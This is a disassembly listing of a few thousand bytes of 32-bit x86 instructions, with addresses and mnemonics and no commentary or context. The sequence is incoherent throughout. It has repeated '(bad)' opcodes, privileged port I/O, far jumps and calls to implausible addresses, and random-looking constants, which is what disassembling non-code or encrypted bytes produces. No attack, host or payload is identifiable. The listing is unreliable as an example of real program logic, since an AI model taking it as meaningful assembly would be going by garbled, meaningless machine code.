  4886cb:	(bad)  
  4886cc:	loope  0x488743
  4886ce:	mov    eax,ds:0x696b1e4b
  4886d3:	pusha  
  4886d4:	into   
  4886d5:	or     al,0xf8
  4886d7:	adc    ecx,DWORD PTR ds:0xe61049f
  4886dd:	xchg   ebx,eax
  4886de:	out    0xe9,eax
  4886e0:	push   cs
  4886e1:	pop    esp
  4886e2:	inc    edx
  4886e3:	sub    DWORD PTR [esp+ecx*1+0xd],edi
  4886e7:	jno    0xeb6feb2d
  4886ed:	ss mov al,0x43
  4886f0:	xchg   ecx,eax
  4886f1:	fimul  WORD PTR [eax+0x20]
  4886f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4886f5:	in     al,dx
  4886f6:	aad    0x18
  4886f8:	repnz nop
  4886fa:	in     al,dx
  4886fb:	jne    0x4886ae
  4886fd:	fs jo  0x488710
  488700:	inc    eax
  488701:	shl    BYTE PTR ds:0x8211d10,0x48
  488708:	ja     0x4886fa
  48870a:	pop    edi
  48870b:	and    al,0x88
  48870d:	mov    ecx,0xeb486020
  488712:	adc    BYTE PTR [eax+0x50d3422d],bh
  488718:	dec    eax
  488719:	cmc    
  48871a:	dec    edi
  48871b:	adc    al,bh
  48871d:	lods   al,BYTE PTR ds:[esi]
  48871e:	xor    edx,eax
  488720:	or     BYTE PTR ds:0xe4947c11,al
  488726:	xchg   BYTE PTR [edx-0x2a],cl
  488729:	pusha  
  48872a:	inc    esi
  48872b:	adc    BYTE PTR [esi-0x5b08ff8],ch
  488731:	(bad)  
  488732:	pop    ss
  488733:	jmp    0x48874b
  488735:	lock sub BYTE PTR [ecx-0x62120bfa],dl
  48873c:	pop    edx
  48873d:	xor    al,0x6
  48873f:	push   0xef101e9f
  488744:	or     BYTE PTR [edx*2+0x65e15792],bh
  48874b:	clc    
  48874c:	sub    BYTE PTR [ecx-0x1a7fcc14],cl
  488752:	adc    DWORD PTR [eax+0x2bfb50e7],edx
  488758:	mov    cl,0xf0
  48875a:	mov    ds:0xffba3a14,al
  48875f:	adc    BYTE PTR [ebp+0x10],dh
  488762:	or     al,0xf6
  488764:	(bad)  
  488765:	or     al,0x67
  488767:	mov    edx,0xf25641e0
  48876c:	sbb    al,0x66
  48876e:	fnstsw WORD PTR [ecx+esi*4-0x14]
  488772:	es sbb eax,0x666700ed
  488778:	jbe    0x48871b
  48877a:	mov    eax,0x751c5210
  48877f:	dec    ecx
  488780:	mov    eax,ds:0xca973e1a
  488785:	mov    ss,WORD PTR [eax]
  488787:	mov    bh,0x33
  488789:	sub    edx,DWORD PTR [eax+0x2eb6073]
  48878f:	mov    al,ds:0x1f125e14
  488794:	jp     0x488758
  488796:	add    eax,0x11312e82
  48879b:	xor    DWORD PTR [eax+esi*1],0x69
  48879f:	lds    esp,FWORD PTR [ebx]
  4887a1:	jmp    0x8e8cab47
  4887a6:	mov    DWORD PTR [edx+0x21],ebp
  4887a9:	lods   al,BYTE PTR ds:[esi]
  4887aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4887ab:	adc    BYTE PTR [eax+0x25],ah
  4887ae:	sub    DWORD PTR [edi+0x6],0x9de0100
  4887b5:	jb     0x48877e
  4887b7:	push   eax
  4887b8:	call   0x13d77ec5
  4887bd:	imul   esp,DWORD PTR [edx],0x11236589
  4887c3:	shr    DWORD PTR [edi-0x1],0x26
  4887c7:	or     al,0x13
  4887c9:	inc    edx
  4887ca:	addr16 loope 0x4887f0
  4887cd:	jb     0x4887ff
  4887cf:	add    cl,BYTE PTR [ebp+edx*8+0x74]
  4887d3:	push   ds
  4887d4:	pop    es
  4887d5:	adc    esp,DWORD PTR [edi-0x6f9fa76d]
  4887db:	mov    esp,0xc48a9e33
  4887e0:	adc    DWORD PTR [edi+0x53891ff1],ebp
  4887e6:	pusha  
  4887e7:	mov    BYTE PTR [eax+0x9],cl
  4887ea:	loopne 0x488850
  4887ec:	popa   
  4887ed:	add    eax,0x2986c630
  4887f2:	fsub   QWORD PTR [edi]
  4887f4:	retf   0x75c
  4887f7:	ret    0xc419
  4887fa:	push   0xbbc1a712
  4887ff:	xor    al,0x86
  488801:	pop    edx
  488802:	enter  0x58f0,0x9b
  488806:	push   eax
  488807:	push   esp
  488808:	mov    bl,0x85
  48880a:	adc    BYTE PTR [edx],al
  48880c:	clc    
  48880d:	mov    ds:0x80c75990,eax
  488812:	xchg   esi,eax
  488813:	lods   eax,DWORD PTR ds:[esi]
  488814:	cmp    eax,0x9e3d910e
  488819:	pop    eax
  48881a:	inc    eax
  48881b:	retf   
  48881c:	dec    ecx
  48881d:	test   al,0xc8
  48881f:	or     edx,DWORD PTR [eax]
  488821:	pusha  
  488822:	(bad)  
  488823:	add    ah,BYTE PTR [edx-0x53]
  488826:	jb     0x4887a8
  488828:	jp     0x488874
  48882a:	cmp    ch,BYTE PTR [ebx+0x2b]
  48882d:	test   BYTE PTR [edi+0x545303e1],ah
  488833:	shl    DWORD PTR [edi],cl
  488835:	sub    al,al
  488837:	retf   
  488838:	xchg   esi,eax
  488839:	push   eax
  48883a:	arpl   WORD PTR [edi+0x3855322],dx
  488840:	ins    BYTE PTR es:[edi],dx
  488841:	pop    ss
  488842:	and    eax,0x789b1f25
  488847:	xchg   edx,eax
  488848:	sahf   
  488849:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48884a:	pusha  
  48884b:	xchg   DWORD PTR ds:0xbc3ace01,ecx
  488851:	mov    esp,0x85e00f93
  488856:	dec    ebp
  488857:	nop
  488858:	pop    ebp
  488859:	es push ebp
  48885b:	push   ds
  48885c:	or     edx,DWORD PTR [ebx+edx*2+0x43]
  488860:	nop
  488861:	sbb    al,dl
  488863:	ret    
  488864:	or     ebp,DWORD PTR [ecx+0x13]
  488867:	or     bh,dh
  488869:	xor    al,0xfa
  48886b:	les    eax,FWORD PTR [ebp-0x2ec99f73]
  488871:	mov    DWORD PTR [eax+0x79],eax
  488874:	lods   al,BYTE PTR ds:[esi]
  488875:	into   
  488876:	mov    eax,DWORD PTR [ebx+0x3d]
  488879:	(bad)  
  48887a:	or     BYTE PTR ds:0x85a7299c,ah
  488880:	sbb    DWORD PTR [eax],esp
  488882:	nop
  488883:	and    BYTE PTR [eax+edi*8-0x78],bl
  488887:	sub    eax,0x439652e1
  48888c:	cld    
  48888d:	xlat   BYTE PTR ds:[ebx]
  48888e:	mov    ch,0x96
  488890:	pusha  
  488891:	inc    edi
  488892:	ja     0x488897
  488894:	push   esp
  488895:	jge    0x4888d8
  488897:	in     eax,dx
  488898:	push   ebx
  488899:	lahf   
  48889a:	and    DWORD PTR [edi+0x50],0xa93b2414
  4888a1:	inc    esi
  4888a2:	inc    eax
  4888a3:	jbe    0x48885d
  4888a5:	push   esp
  4888a6:	mov    al,ds:0x68c9105b
  4888ab:	out    dx,al
  4888ac:	(bad)  
  4888ad:	cdq    
  4888ae:	xor    al,0x85
  4888b0:	push   ds
  4888b1:	adc    BYTE PTR [esi-0x25],dl
  4888b4:	shl    cl,0xd5
  4888b7:	mov    dh,BYTE PTR [ebp+0x20df1110]
  4888bd:	fwait
  4888be:	retf   0x3f63
  4888c1:	fist   WORD PTR [esi]
  4888c3:	leave  
  4888c4:	retf   0x1551
  4888c7:	inc    esp
  4888c8:	enter  0x5251,0x4f
  4888cc:	test   BYTE PTR [edx],cl
  4888ce:	(bad)  
  4888cf:	fdiv   DWORD PTR [eax-0x71089caa]
  4888d5:	pop    edi
  4888d6:	test   DWORD PTR ds:0x74fc589f,esp
  4888dc:	pop    ecx
  4888dd:	popa   
  4888de:	adc    dl,BYTE PTR [esi-0x65]
  4888e1:	inc    edx
  4888e2:	and    eax,0xf47080c8
  4888e7:	pop    ebx
  4888e8:	inc    ebp
  4888e9:	jae    0x4888d8
  4888eb:	push   0xb3419c28
  4888f0:	jle    0x48891f
  4888f2:	xor    ecx,DWORD PTR ds:0x4047c646
  4888f8:	sub    esp,DWORD PTR [eax]
  4888fa:	push   ebx
  4888fb:	xor    ecx,DWORD PTR [esi-0x36e571cc]
  488901:	fadd   DWORD PTR gs:[edi]
  488904:	daa    
  488905:	sbb    ah,BYTE PTR [ebx+0x15]
  488908:	mov    al,ds:0xa475f8bb
  48890d:	dec    ebp
  48890e:	mov    cl,0xde
  488910:	xchg   edx,eax
  488911:	jl     0x488934
  488913:	pop    ss
  488914:	clc    
  488915:	mov    esp,0xf364d3a5
  48891a:	jo     0x488928
  48891c:	pop    ebp
  48891d:	add    BYTE PTR [esi],al
  48891f:	cmp    BYTE PTR [ecx+eiz*2],dl
  488922:	rcl    BYTE PTR [eax],0xcf
  488925:	(bad)  
  488926:	mov    bl,0x23
  488928:	sbb    DWORD PTR [ebx],edi
  48892a:	or     bl,al
  48892c:	fs jecxz 0x4888d9
  48892f:	add    ecx,esp
  488931:	clc    
  488932:	push   ebp
  488933:	jmp    0x48896b
  488935:	test   ch,ch
  488937:	inc    ebp
  488938:	mov    ecx,0x120a0d77
  48893d:	adc    ecx,DWORD PTR [edi+0x7e]
  488940:	mov    bl,0x53
  488942:	pusha  
  488943:	nop
  488944:	or     BYTE PTR [esi+0x17e91412],al
  48894a:	imul   ecx,DWORD PTR [ecx+eiz*1],0xdbf9003f
  488951:	dec    eax
  488952:	sub    al,0xb4
  488954:	in     al,0x7f
  488956:	and    bh,dl
  488958:	jge    0x488966
  48895a:	jle    0x488936
  48895c:	xchg   ebx,eax
  48895d:	shl    BYTE PTR [ebp+0x30a67c28],1
  488963:	ss lock jge 0x488956
  488967:	fisubr WORD PTR [ecx-0x20]
  48896a:	daa    
  48896b:	ss inc edi
  48896d:	ss add ebp,ebx
  488970:	mov    DWORD PTR ds:0xe426e16e,edx
  488976:	mov    esi,0x14465d9f
  48897b:	cmp    al,al
  48897d:	jg     0x48894a
  48897f:	mov    cl,0x72
  488981:	sbb    al,0xc2
  488983:	scas   al,BYTE PTR es:[edi]
  488984:	scas   eax,DWORD PTR es:[edi]
  488985:	add    DWORD PTR [ecx],edx
  488987:	aas    
  488988:	test   DWORD PTR [edi+0x5320f022],esp
  48898e:	pop    ss
  48898f:	inc    ebx
  488990:	xchg   BYTE PTR [ebx+ecx*1],dh
  488993:	scas   eax,DWORD PTR es:[edi]
  488994:	and    al,0x94
  488996:	data16 sbb BYTE PTR [ecx+0x906666e],bh
  48899d:	adc    al,0xa5
  48899f:	fcomp  DWORD PTR [ecx+0x55]
  4889a2:	loop   0x48895a
  4889a4:	and    ebx,DWORD PTR [eax]
  4889a6:	pop    esp
  4889a7:	unpckhps xmm7,XMMWORD PTR [esi+0x78]
  4889ab:	cdq    
  4889ac:	pop    esi
  4889ad:	sbb    al,0x2b
  4889af:	pop    ds
  4889b0:	push   eax
  4889b1:	add    DWORD PTR [edi],edx
  4889b3:	dec    ecx
  4889b4:	push   ss
  4889b5:	mov    es,WORD PTR [edx+esi*1+0x2f3c02ad]
  4889bc:	lods   al,BYTE PTR ds:[esi]
  4889bd:	xlat   BYTE PTR ds:[ebx]
  4889be:	aad    0xc0
  4889c0:	and    ah,BYTE PTR [ebx-0x197ac492]
  4889c6:	jo     0x4889df
  4889c8:	popf   
  4889c9:	aad    0x47
  4889cb:	add    dh,al
  4889cd:	gs push edi
  4889cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4889d0:	pop    eax
  4889d1:	pop    ecx
  4889d2:	adc    DWORD PTR [esi],ebp
  4889d4:	xchg   edi,eax
  4889d5:	mov    al,0xf9
  4889d7:	jmp    0xb370aeb0
  4889dc:	add    ecx,ebp
  4889de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4889df:	fs jmp 0x62a183f5
  4889e5:	jbe    0x488a1c
  4889e7:	bound  esp,QWORD PTR [ecx]
  4889e9:	add    ah,BYTE PTR [esi]
  4889eb:	cmp    al,0x2a
  4889ed:	mov    cl,0xd8
  4889ef:	xchg   al,ah
  4889f1:	ds (bad) 
  4889f3:	cmp    DWORD PTR [ebx+0x15],ebx
  4889f6:	sub    al,0x17
  4889f8:	int3   
  4889f9:	sub    DWORD PTR [ecx+ebx*2+0x50],ecx
  4889fd:	mov    ecx,0x572bd65a
  488a02:	and    al,0x9d
  488a04:	inc    edx
  488a05:	xchg   DWORD PTR [edx-0x62825fc5],ecx
  488a0b:	jbe    0x488a04
  488a0d:	repnz sbb al,0x9b
  488a10:	mov    ecx,0x25f81729
  488a15:	add    eax,edi
  488a17:	sbb    ax,WORD PTR [ecx]
  488a1a:	fistp  DWORD PTR [ecx-0x34bd145d]
  488a20:	lods   al,BYTE PTR ds:[esi]
  488a21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  488a22:	imul   ebp,DWORD PTR [esi+0x7b],0xac491537
  488a29:	inc    edi
  488a2a:	inc    ebp
  488a2b:	dec    esp
  488a2c:	in     eax,dx
  488a2d:	lods   eax,DWORD PTR ds:[esi]
  488a2e:	test   DWORD PTR [edx-0x27],esi
  488a31:	xchg   DWORD PTR [edi+eiz*1-0x7b42de20],ebp
  488a38:	(bad)  [edx]
  488a3a:	push   ebx
  488a3b:	push   ecx
  488a3c:	add    DWORD PTR [edi+0x14576d86],ebp
  488a42:	jno    0x488a34
  488a44:	add    dl,0xa8
  488a47:	call   eax
  488a49:	std    
  488a4a:	mov    BYTE PTR [ebx-0x34023a9c],0x21
  488a51:	sub    al,0x3f
  488a53:	enter  0x90c2,0x14
  488a57:	add    esp,DWORD PTR [esi+0x156a9e58]
  488a5d:	pop    eax
  488a5e:	inc    edx
  488a5f:	aaa    
  488a60:	mov    esi,0x82c13d40
  488a65:	jmp    0x488a1a
  488a67:	into   
  488a68:	push   esi
  488a69:	inc    esp
  488a6a:	push   0xffffffc0
  488a6c:	imul   esp,eax,0xffffffad
  488a6f:	fisttp QWORD PTR [ecx-0x7616fa57]
  488a75:	jo     0x488ad2
  488a77:	rol    BYTE PTR [eax-0x69ebdfad],cl
  488a7d:	pop    ebx
  488a7e:	push   es
  488a7f:	test   esi,eax
  488a81:	push   ss
  488a82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  488a83:	xchg   BYTE PTR [ebx-0x47],bl
  488a86:	or     BYTE PTR [edi+0x4c],bl
  488a89:	ret    0x120e
  488a8c:	das    
  488a8d:	mov    eax,DWORD PTR [edi]
  488a8f:	fcom   DWORD PTR [eax]
  488a91:	ss add al,0xf8
  488a94:	or     BYTE PTR [eax+0x60],dh
  488a97:	pop    ss
  488a98:	ss je  0x488b19
  488a9b:	add    DWORD PTR [ecx+0x17246b31],ebp
  488aa1:	cmp    eax,DWORD PTR [edx+0x54]
  488aa4:	jl     0x488aab
  488aa6:	ins    BYTE PTR es:[edi],dx
  488aa7:	xlat   BYTE PTR ds:[ebx]
  488aa8:	cmp    al,0xd3
  488aaa:	or     al,0x89
  488aac:	dec    esi
  488aad:	push   eax
  488aae:	pop    es
  488aaf:	mov    bl,0xc
  488ab1:	sub    esi,DWORD PTR [ebx]
  488ab3:	xor    ah,BYTE PTR [ecx]
  488ab5:	out    dx,eax
  488ab6:	in     eax,0x7f
  488ab8:	cmp    ebp,ebx
  488aba:	xor    al,0x6a
  488abc:	add    dl,BYTE PTR [eax+0x21]
  488abf:	rol    BYTE PTR [esi+0x32],cl
  488ac2:	push   eax
  488ac3:	xor    bh,BYTE PTR [edi-0x1c]
  488ac6:	or     ebp,DWORD PTR [ebx-0x4721789c]
  488acc:	enter  0x543,0x68
  488ad0:	mov    eax,0x43bc84f1
  488ad5:	or     DWORD PTR ds:0x7f027363,ecx
  488adb:	and    dh,BYTE PTR [esi+0x19]
  488ade:	pop    edi
  488adf:	jnp    0x488b0d
  488ae1:	cli    
  488ae2:	call   0x204b9b07
  488ae7:	sub    eax,0x24be3e0
  488aec:	push   ds
  488aed:	out    dx,al
  488aee:	dec    ecx
  488aef:	dec    eax
  488af0:	push   ebp
  488af1:	mov    bl,0x7f
  488af3:	add    al,0xf1
  488af5:	mov    ds:0x79d355ac,al
  488afa:	sub    eax,0x5a0cae2d
  488aff:	icebp  
  488b00:	retf   
  488b01:	jl     0x488b68
  488b03:	test   DWORD PTR [edx],eax
  488b05:	adc    cl,BYTE PTR [edi]
  488b07:	test   DWORD PTR [esi+0x3],eax
  488b0a:	xor    BYTE PTR [ecx+0x36950138],al
  488b10:	add    al,0x8e
  488b12:	sbb    al,0x37
  488b14:	dec    eax
  488b15:	push   eax
  488b16:	js     0x488b57
  488b18:	cmp    BYTE PTR ds:0x7990a77b,ch
  488b1e:	push   ds
  488b1f:	cmp    bh,dh
  488b21:	sbb    dh,BYTE PTR [ebx]
  488b23:	pusha  
  488b24:	outs   dx,BYTE PTR ds:[esi]
  488b25:	pop    ss
  488b26:	aas    
  488b27:	xor    ah,BYTE PTR [esi+0x1a36ac38]
  488b2d:	retf   0xedbc
  488b30:	xchg   ebx,eax
  488b31:	push   0xea0931da
  488b36:	push   eax
  488b37:	or     al,al
  488b39:	push   esp
  488b3a:	mov    bh,0x96
  488b3c:	ins    DWORD PTR es:[edi],dx
  488b3d:	mov    bh,0x4b
  488b3f:	test   al,0x18
  488b41:	pop    ecx
  488b42:	push   ecx
  488b43:	test   DWORD PTR [ebx+0x14],ebx
  488b46:	mov    ch,0x8d
  488b48:	adc    eax,0x213d5f16
  488b4d:	rol    BYTE PTR [esi-0x2c],cl
  488b50:	loopne 0x488b10
  488b52:	and    BYTE PTR [eax+0x22bfb412],bl
  488b58:	sbb    dh,BYTE PTR [ebp+edi*2-0x1c551510]
  488b5f:	in     al,0xc0
  488b61:	push   0x1c
  488b63:	sub    BYTE PTR [ebp+0x467901a8],0x4
  488b6a:	cmp    esp,eax
  488b6c:	into   
  488b6d:	xchg   ah,bl
  488b6f:	popf   
  488b70:	hlt    
  488b71:	xchg   esi,eax
  488b72:	sbb    bl,BYTE PTR [ebp-0x261dfa75]
  488b78:	outs   dx,DWORD PTR ds:[esi]
  488b79:	mov    DWORD PTR [edx],edx
  488b7b:	jne    0x488b8f
  488b7d:	ja     0x488b97
  488b7f:	addr16 mov dh,0x7c
  488b82:	je     0x488b26
  488b84:	jl     0x488b3f
  488b86:	dec    ebp
  488b87:	sub    edi,eax
  488b89:	jae    0x488bfb
  488b8b:	cmp    ch,BYTE PTR [ebx]
  488b8d:	or     DWORD PTR [ebp+0x5c6d8c68],esp
  488b93:	adc    eax,0x677013d4
  488b98:	add    edi,DWORD PTR [eax+0x5b]
  488b9b:	mov    eax,0xa16ee9ec
  488ba0:	je     0x488ba9
  488ba2:	or     esp,DWORD PTR [edx]
  488ba4:	sub    DWORD PTR [ebx+eiz*8],edx
  488ba7:	mov    ah,0x1f
  488ba9:	ss cdq 
  488bab:	add    DWORD PTR [edx+0x7623b010],esp
  488bb1:	scas   eax,DWORD PTR es:[edi]
  488bb2:	push   eax
  488bb3:	pop    ebp
  488bb4:	adc    al,BYTE PTR [esi]
  488bb6:	sti    
  488bb7:	leave  
  488bb8:	dec    DWORD PTR [ebx+0x2]
  488bbb:	cld    
  488bbc:	adc    al,0x3c
  488bbe:	xor    eax,0x246a83e9
  488bc3:	jno    0x488c3d
  488bc5:	test   al,0x5d
  488bc7:	push   ds
  488bc8:	mov    dh,0x1
  488bca:	adc    al,0x88
  488bcc:	lods   al,BYTE PTR ds:[esi]
  488bcd:	out    0xc2,al
  488bcf:	mov    ds:0x47226122,al
  488bd4:	outs   dx,DWORD PTR ds:[esi]
  488bd5:	sbb    al,0xdc
  488bd7:	or     DWORD PTR [ebp+0x4],esp
  488bda:	mov    esi,0xb8219520
  488bdf:	loopne 0x488c1a
  488be1:	add    BYTE PTR [ebx+ebx*1-0x325a2335],0x1
  488be9:	gs inc ecx
  488beb:	and    eax,0x86bccab8
  488bf0:	sub    eax,0x28bd83a0
  488bf5:	adc    al,0x18
  488bf7:	pop    es
  488bf8:	loop   0x488bfe
  488bfa:	mov    dl,0x20
  488bfc:	lods   al,BYTE PTR ds:[esi]
  488bfd:	xor    BYTE PTR [eax],bl
  488bff:	push   ds
  488c00:	xor    al,0x20
  488c02:	or     BYTE PTR [eax+0x40],ah
  488c05:	add    DWORD PTR [ecx],eax
  488c07:	adc    DWORD PTR [esi+0x26969734],0x2c
  488c0e:	aas    
  488c0f:	and    al,BYTE PTR [ebx]
  488c11:	add    al,0x37
  488c13:	sbb    DWORD PTR [ecx+ebp*2],esp
  488c16:	add    ecx,ebx
  488c18:	rcl    BYTE PTR ds:0x77f79c3e,0x9
  488c1f:	jo     0x488c03
  488c21:	ja     0x488c73
  488c23:	adc    BYTE PTR [edi],cl
  488c25:	mov    edi,0x3c684514
  488c2a:	aad    0x83
  488c2c:	xor    dh,BYTE PTR [ebp-0x73]
  488c2f:	inc    ebx
  488c30:	das    
  488c31:	and    BYTE PTR [edi],bh
  488c33:	inc    esp
  488c34:	loopne 0x488c11
  488c36:	jne    0x488bfe
  488c38:	inc    esi
  488c39:	xor    al,0xff
  488c3b:	push   esi
  488c3c:	xor    bh,al
  488c3e:	retf   0x1927
  488c41:	cmp    BYTE PTR [eax+eax*1+0x656b46c7],bh
  488c48:	mov    cl,0xc8
  488c4a:	inc    esi
  488c4b:	cld    
  488c4c:	scas   eax,DWORD PTR es:[edi]
  488c4d:	cdq    
  488c4e:	cmp    al,0xd1
  488c50:	sub    eax,0x38c8c0a1
  488c55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  488c56:	jmp    0x99f9:0x7bf74092
  488c5d:	mov    edi,0x40647521
  488c62:	iret   
  488c63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  488c64:	add    bl,BYTE PTR [edx+0x2a]
  488c67:	mov    BYTE PTR [ecx-0x431f012f],0x56
  488c6e:	in     eax,0xcf
  488c70:	repz loopne 0x488c9e
  488c73:	inc    esi
  488c74:	loopne 0x488c7e
  488c76:	inc    esi
  488c77:	inc    esp
  488c78:	pop    edx
  488c79:	out    0xcd,eax
  488c7b:	mov    edx,0x2be8f246
  488c80:	push   ebp
  488c81:	loopne 0x488c28
  488c83:	rol    DWORD PTR [edx],1
  488c85:	repnz adc al,BYTE PTR [esi+0x4c]
  488c89:	xchg   esi,eax
  488c8a:	mov    eax,0x14c1bc8b
  488c8f:	or     al,0xb8
  488c91:	add    edi,eax
  488c93:	inc    ebp
  488c94:	js     0x488cae
  488c96:	lea    esi,[ebp-0x3e]
  488c99:	sbb    DWORD PTR [edx+0x25],ebp
  488c9c:	or     ebp,ebx
  488c9e:	push   es
  488c9f:	or     BYTE PTR [edi],cl
  488ca1:	pop    esi
  488ca2:	or     DWORD PTR ds:0xfc5da60b,edx
  488ca8:	jae    0x488c42
  488caa:	jno    0x488cd1
  488cac:	pop    ss
  488cad:	sbb    eax,0x24abc8b
  488cb2:	pop    eax
  488cb3:	leave  
  488cb4:	mov    eax,0x8e51229f
  488cb9:	add    esi,0xd0856c0
  488cbf:	cmp    al,0x85
  488cc1:	or     dl,bh
  488cc3:	mov    ebp,0x60684f6f
  488cc8:	or     ah,ch
  488cca:	add    al,0x7d
  488ccc:	sub    al,0x27
  488cce:	add    DWORD PTR [ebp-0x36],esi
  488cd1:	pop    ss
  488cd2:	jbe    0x488c64
  488cd4:	push   ds
  488cd5:	jg     0x488cef
  488cd7:	adc    ecx,DWORD PTR [esi-0x80]
  488cda:	jb     0x488ce2
  488cdc:	loope  0x488ce3
  488cde:	(bad)  
  488cdf:	or     bh,BYTE PTR [ebp+0x73]
  488ce2:	inc    esi
  488ce3:	or     eax,0xc080b65
  488ce8:	popa   
  488ce9:	scas   al,BYTE PTR es:[edi]
  488cea:	daa    
  488ceb:	mov    al,ds:0x5f6e220a
  488cf0:	lods   eax,DWORD PTR ds:[esi]
  488cf1:	das    
  488cf2:	or     BYTE PTR [ebx-0x32],dh
  488cf5:	push   esi
  488cf6:	stos   DWORD PTR es:[edi],eax
  488cf7:	outs   dx,DWORD PTR ds:[esi]
  488cf8:	bound  edi,QWORD PTR [edx+eax*1-0x3c]
  488cfc:	xchg   edi,eax
  488cfd:	jecxz  0x488cd4
  488cff:	and    ecx,DWORD PTR [esi+eax*8+0x4f]
  488d03:	push   ds
  488d04:	push   0x13
  488d06:	test   eax,0x7c50c23
  488d0b:	jge    0x488c95
  488d0d:	clc    
  488d0e:	iret   
  488d0f:	sbb    ah,bh
  488d11:	ror    DWORD PTR [esi],0x6a
  488d14:	dec    ebx
  488d15:	cmp    ebx,ebx
  488d17:	inc    ebx
  488d18:	mov    BYTE PTR [esi+0x20],bl
  488d1b:	sub    esp,ebx
  488d1d:	mov    ebx,DWORD PTR [edx+0x69]
  488d20:	jbe    0x488d68
  488d22:	adc    BYTE PTR [eax+ebp*2+0x4b3d058c],dl
  488d29:	jno    0x488cf2
  488d2b:	xchg   DWORD PTR [edx-0x1],ecx
  488d2e:	push   eax
  488d2f:	add    al,0x7a
  488d31:	lea    ecx,[ebx+0x14]
  488d34:	lea    edx,[ebx+0x24]
  488d37:	dec    edx
  488d38:	cs loopne 0x488da6
  488d3b:	aad    0x5e
  488d3d:	nop
  488d3e:	sub    ah,BYTE PTR [ebx+0x53]
  488d41:	inc    ecx
  488d42:	imul   esi,esi,0x22
  488d45:	mov    al,0x20
  488d47:	pop    edx
  488d48:	or     BYTE PTR ds:0x69df2952,cl
  488d4e:	push   eax
  488d4f:	mov    al,ds:0xb0295537
  488d54:	adc    eax,ebp
  488d56:	mov    ds:0x9b83b507,eax
  488d5b:	jmp    0x488d63
  488d5d:	sbb    DWORD PTR [eax],edi
  488d5f:	fisttp WORD PTR [esi]
  488d61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  488d62:	xor    BYTE PTR [edi+0x2c],cl
  488d65:	pop    es
  488d66:	or     BYTE PTR [edi+0x74],ah
  488d69:	and    ebx,ebp
  488d6b:	push   eax
  488d6c:	inc    BYTE PTR [esi+0x686167d0]
  488d72:	cmp    BYTE PTR [ebx+0xd],0x10
  488d76:	sbb    DWORD PTR [ebx+ebp*8-0x66f628c6],esi
  488d7d:	int    0x11
  488d7f:	test   BYTE PTR [eax+0x2e],ah
  488d82:	mov    WORD PTR [ebx],gs
  488d84:	cmp    esi,DWORD PTR [esi]
  488d86:	cmp    DWORD PTR cs:[eax],esi
  488d89:	mov    al,ds:0xc8eb433a
  488d8e:	add    eax,0xb997c9e1
  488d93:	push   ecx
  488d94:	sbb    BYTE PTR [ebx+0x18],dh
  488d97:	cmp    DWORD PTR [eax],edx
  488d99:	dec    edi
  488d9a:	sbb    cl,BYTE PTR [ebp-0x59]
  488d9d:	sub    cl,0x59
  488da0:	in     al,dx
  488da1:	and    al,0xc
  488da3:	dec    ebx
  488da4:	adc    DWORD PTR [ecx+0x26264f90],esi
  488daa:	xor    eax,0xbfd20afc
  488daf:	jo     0x488da8
  488db1:	xor    BYTE PTR [ecx+0x3d],0xf8
  488db5:	stc    
  488db6:	sbb    al,0x68
  488db8:	loopne 0x488de0
  488dba:	xor    BYTE PTR [ebx-0x376cef24],0x16
  488dc1:	cdq    
  488dc2:	int    0xe5
  488dc4:	xchg   BYTE PTR [ebx],ah
  488dc6:	cmp    eax,0xc76b7048
  488dcb:	out    dx,al
  488dcc:	in     eax,dx
  488dcd:	mov    ecx,0xee8598
  488dd2:	clc    
  488dd3:	push   ecx
  488dd4:	fsub   DWORD PTR [ebx+0x3384372a]
  488dda:	jmp    0x488d76
  488ddc:	xchg   ebp,eax
  488ddd:	rol    BYTE PTR [eax+eax*8],cl
  488de0:	mov    eax,ds:0xfc7b5021
  488de5:	nop
  488de6:	out    0x85,eax
  488de8:	xor    al,0x28
  488dea:	adc    al,0x0
  488dec:	mov    ebp,DWORD PTR [eax]
  488dee:	sub    dl,BYTE PTR [edi]
  488df0:	push   edx
  488df1:	mov    ecx,0x58084004
  488df6:	pop    esp
  488df7:	dec    eax
  488df8:	in     eax,0x42
  488dfa:	or     al,0x6c
  488dfc:	adc    BYTE PTR [ecx],ah
  488dfe:	xchg   ebp,eax
  488dff:	or     ebp,DWORD PTR [ecx+0x549c1484]
  488e05:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  488e07:	jb     0x488e21
  488e09:	mov    eax,0x3461c41c
  488e0e:	into   
  488e0f:	test   DWORD PTR [eax],esp
  488e11:	cmp    ebp,DWORD PTR [ecx+0x24]
  488e14:	mov    ecx,cs
  488e16:	fnstcw WORD PTR [edi+0x6d480bff]
  488e1c:	add    BYTE PTR [edi],dh
  488e1e:	ja     0x488e72
  488e20:	mov    dl,0x23
  488e22:	mov    bh,0xe
  488e24:	xor    BYTE PTR [esi+0x4c],cl
  488e27:	push   ebx
  488e28:	shr    ch,0x4f
  488e2b:	push   ecx
  488e2c:	mov    ds:0x69784d49,eax
  488e31:	ins    DWORD PTR es:[edi],dx
  488e32:	ins    DWORD PTR es:[edi],dx
  488e33:	adc    bl,bl
  488e35:	adc    BYTE PTR [eax],bl
  488e37:	cdq    
  488e38:	dec    ecx
  488e39:	push   ss
  488e3a:	inc    edi
  488e3b:	gs and eax,0x41455b3b
  488e41:	pop    ds
  488e42:	push   edx
  488e43:	gs dec esp
  488e45:	les    ebp,FWORD PTR [eax+esi*1+0x3]
  488e49:	push   esp
  488e4a:	daa    
  488e4b:	inc    edi
  488e4c:	jbe    0x488e61
  488e4e:	and    al,0x5b
  488e50:	mov    DWORD PTR [esi],ecx
  488e52:	or     al,0xc6
  488e54:	or     eax,0x75ef90a5
  488e59:	jae    0x488e8a
  488e5b:	push   ebx
  488e5c:	add    BYTE PTR [edi+0x23aa2d85],ah
  488e62:	push   edi
  488e63:	ins    DWORD PTR es:[edi],dx
  488e64:	jo     0x488e83
  488e66:	adc    cl,BYTE PTR [edx+0x6c]
  488e69:	sbb    DWORD PTR [ebx],ebp
